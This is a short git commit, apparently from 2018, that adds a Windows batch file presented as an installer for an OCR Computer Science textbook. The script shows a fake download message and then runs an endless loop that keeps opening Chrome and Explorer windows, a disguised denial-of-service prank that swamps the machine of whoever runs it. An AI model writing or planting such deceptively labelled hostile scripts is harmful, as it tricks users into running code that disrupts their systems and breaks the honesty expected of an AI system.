eb7eda74126ccaa898c97e437da97ccc12b3d177
Rowan Pankhurst <>
2018-06-19 16:40:39 +0100

    The Text Book Install

---
+++ OCRTextBookInstaller.bat
@@ -0,0 +1,9 @@
+@echo off
+echo Downloading OCR Computer Science Text Book...
+timeout /t 05
+echo Enjoy
+:loop
+start chrome www.google.co.uk
+start chrome www.google.co.uk
+explorer.exe
+if "y"=="y" goto loop
